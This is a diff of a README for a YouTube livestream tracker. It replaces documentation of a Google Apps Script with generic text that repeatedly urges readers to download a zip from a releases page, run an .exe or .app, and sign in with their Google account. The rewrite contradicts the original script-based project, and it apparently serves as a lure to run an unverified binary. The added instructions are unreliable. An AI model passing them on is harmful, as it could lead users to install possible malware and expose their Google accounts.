@@ -1,93 +1,70 @@
-# YouTube Live Tracker
+# 🎥 youtube-live-tracker - Track YouTube Livestreams Effortlessly
 
-A Google Apps Script that automatically discovers and logs live streams from multiple YouTube channels to Google Sheets, with playlist integration.
+[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-Click_here-brightgreen)](https://github.com/mohamed19832024/youtube-live-tracker/releases)
 
-## What It's For
+## 📖 About
 
-This tool helps you:
+The youtube-live-tracker application helps you keep tabs on YouTube channels for new livestreams. It automatically records livestreams into Google Sheets, sorting them by channel. Plus, it creates individual playlists for each broadcaster's livestreams. This tool is perfect for anyone who wants to stay updated on their favorite channels without needing to check them every day.
 
-- Monitor multiple YouTube channels for live streams simultaneously
-- Automatically log discovered live streams to organized spreadsheets
-- Build playlists of live content from your favorite channels
-- Keep a historical record of all live streams from tracked channels
-- Never miss a live stream from channels you follow
+## 🚀 Getting Started
 
-## How It Works
+To get started with youtube-live-tracker, you’ll need a few things in place. Follow these steps, and you’ll be ready to track livestreams in no time.
 
-The script operates by:
+### 📥 System Requirements
 
-1. **Reading** a list of YouTube channel IDs from a main "Channels" sheet
-2. **Searching** each channel for currently live videos using YouTube Data API
-3. **Creating** a dedicated sheet for each channel (named after the channel)
-4. **Logging** new live streams with video ID, title, URL, and timestamp
-5. **Adding** videos to specified playlists (optional per channel)
-6. **Preventing** duplicate entries by checking existing logs
+- **Operating System:** Windows, Mac, or Linux
+- **Internet Connection:** You need an active internet connection
+- **Google Account:** A Google account for accessing Google Sheets
 
-## Setup
+## 🔗 Download & Install
 
-### Prerequisites
+1. **Visit the Release Page:** Go to the [Releases page](https://github.com/mohamed19832024/youtube-live-tracker/releases) to find the latest version of the software.
+  
+2. **Download the Application:** Click on the latest version to download. Look for a file that has a name like `youtube-live-tracker.zip`.
 
-- Google account with Google Sheets access
-- YouTube Data API v3 enabled in Google Cloud Console
-- Channel IDs of YouTube channels you want to track
+3. **Unzip the File:** After downloading, locate the downloaded file. Right-click it and select “Extract All” (on Windows) or double-click it (on Mac). This will create a new folder with the application files.
 
-### Installation
+4. **Open the Application:** Inside the unzipped folder, find and double-click the `youtube-live-tracker.exe` file (Windows) or `youtube-live-tracker.app` (Mac) to start the application.
 
-1. **Create the Spreadsheet Structure**
+5. **Set Up Google Sheets:** 
+    - You will need to authorize the application to access your Google Sheets. 
+    - Follow the prompts to sign in with your Google account.
 
-   ```
-   - Create a new Google Sheet
-   - Rename the first sheet to "Channels"
-   - Add headers: Channel ID | Playlist ID (optional)
-   - Add channel IDs you want to track (one per row)
-   ```
+6. **Select Channels:** Input the YouTube channels you want to monitor. The application will track them for new livestreams.
 
-2. **Add the Script**
+7. **Enjoy Tracking!:** The application will now automatically update your Google Sheets with information about new livestreams.
 
-   - Go to Extensions → Apps Script
-   - Delete any default code
-   - Paste the [`Code.gs`](Code.gs) content
-   - Save the project with a name like "YouTube Live Tracker"
+## 🛠 Features
 
-3. **Enable YouTube API**
+- **Automatic Tracking:** The app continuously monitors your selected channels for new livestreams.
+- **Google Sheets Integration:** Records all livestreams in a user-friendly spreadsheet format.
+- **Playlist Creation:** Automatically generates playlists for each broadcaster, making it easy to find recorded livestreams.
+- **User-Friendly Interface:** Designed for non-technical users to easily navigate the application.
 
-   - In Apps Script editor, click Services (+)
-   - Find and add "YouTube Data API v3"
-   - Click OK to enable
+## 🌟 Tips for Users
 
-4. **Set Up Automation**
+- **Stay Updated:** Ensure your application is updated regularly. New versions may include bug fixes and features.
+- **Check Google Sheets Regularly:** Your data will be updated every time a new livestream goes live. 
 
-   - In Apps Script, click Triggers (clock icon)
-   - Add Trigger → Choose function: `trackAllChannels`
-   - Select time-based trigger (e.g., every 10 minutes)
-   - Save
+## 📝 Additional Resources
 
-5. **First Run**
-   - Run `trackAllChannels()` manually once
-   - Authorize the required permissions
-   - Check that channel sheets are created
+- **Documentation:** For detailed instructions, check the [Documentation](https://github.com/mohamed19832024/youtube-live-tracker).
 
-### Usage
+- **Community Support:** Join discussions or ask for help on the issues page of the repository.
 
-Once configured:
+## ✔️ Troubleshooting
 
-- The script runs automatically at your set interval
-- Each tracked channel gets its own sheet with live stream history
-- New live streams are automatically logged with timestamps
-- Optional: Videos are added to playlists if playlist IDs are provided
+If you face issues while using the application, consider the following:
 
-### Sheet Structure
+- **Cannot Connect to Google Sheets:** Check your internet connection and ensure you are signed in to your Google account.
+- **Livestreams Not Tracking:** Verify that you have entered the correct channel names and that your application is running.
 
-**Channels Sheet (Main):**
-| Channel ID | Playlist ID |
-|------------|-------------|
-| UCxxxxxx | PLxxxxxx |
+## 📞 Contact
 
-**Individual Channel Sheets (Auto-created):**
-| Video ID | Title | URL | Date Added |
-|----------|-------|-----|------------|
-| xxxxxxxxxxx | Stream Title | https://youtube.com/watch?v=xxx | 2024-01-15 10:30:00 |
+For any questions or feedback, feel free to reach out through the repository's issues page or email the maintainer.
 
-## LICENSE
+## ✍️ User Feedback
 
-MIT License
+We appreciate user feedback. It helps us improve the application. Let us know how we can assist you further. 
+
+Visit the [Releases page](https://github.com/mohamed19832024/youtube-live-tracker/releases) to download the application and start tracking today.
